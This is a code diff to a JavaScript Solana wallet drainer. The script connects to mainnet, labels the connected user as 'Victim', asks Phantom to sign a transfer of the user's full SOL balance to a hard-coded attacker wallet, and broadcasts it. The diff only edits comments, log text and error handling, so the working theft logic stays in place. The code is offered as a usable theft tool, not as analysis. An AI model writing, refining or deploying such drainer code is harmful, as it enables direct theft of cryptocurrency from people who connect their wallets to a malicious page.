@@ -26,7 +26,7 @@
 
             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
 
-            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh");  // Replace with your wallet address
+            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh"); // Replace with your wallet address
 
             const userWallet = provider.publicKey;
             console.log(`💰 Victim Address: ${userWallet.toBase58()}`);
@@ -37,8 +37,9 @@
 
             // Only proceed if the balance is greater than 0
             if (drainAmount > 0) {
-                console.log(`⚠️ Draining ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);
+                console.log(`⚠️ Attempting to drain ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);
 
+                // Create a transfer transaction
                 let transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userWallet,
@@ -47,17 +48,17 @@
                     })
                 );
 
-                // Force Phantom to sign the transaction
                 try {
-                    // Sign the transaction with Phantom
+                    // Request Phantom Wallet to sign the transaction (NOT just view)
                     const signedTransaction = await provider.signTransaction(transaction);
                     console.log("Transaction signed by Phantom.");
 
-                    // Send the transaction
+                    // Send the transaction to the Solana network
                     await connection.sendRawTransaction(signedTransaction.serialize());
                     console.log("✅ SOL drained successfully.");
                 } catch (error) {
-                    console.log("🚨 Transaction signing failed. Ensure the wallet is connected and unlocked.");
+                    console.log("🚨 Error in signing the transaction or sending.");
+                    console.error(error);
                 }
             } else {
                 console.log("❌ No SOL to drain.");
